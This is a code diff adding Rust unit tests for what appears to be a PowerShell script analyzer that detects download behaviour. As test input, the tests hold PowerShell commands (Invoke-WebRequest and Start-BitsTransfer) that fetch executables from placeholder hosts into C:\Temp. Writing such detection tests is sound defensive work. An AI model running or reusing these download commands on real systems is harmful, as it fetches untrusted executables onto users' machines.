@@ -8232,6 +8232,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_equals_bound_uri_and_outfile_preserve_destination() {
+        let ps = r#"Invoke-WebRequest -Uri=https://iwr-equals.example/payload.exe -OutFile=C:\Temp\equals.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-equals.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\equals.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR equals-bound Uri/OutFile was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_header_urls_are_not_promoted_to_downloads() {
         let ps = r#"Invoke-WebRequest -Headers @{Referer="https://ps-decoy.example/landing"} -Uri https://ps-actual.example/payload.exe -OutFile payload.exe"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -8737,6 +8756,26 @@ mod ps1_url_extraction_tests {
         assert!(
             has,
             "BITS schemeless -Source was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_equals_bound_schemeless_source_extracted() {
+        let ps =
+            r#"Start-BitsTransfer -Destination=C:\Temp\bits.exe -Source=bits-equals.com/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://bits-equals.com/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS equals-bound schemeless -Source was not extracted: {:?}",
             report.traits
         );
     }
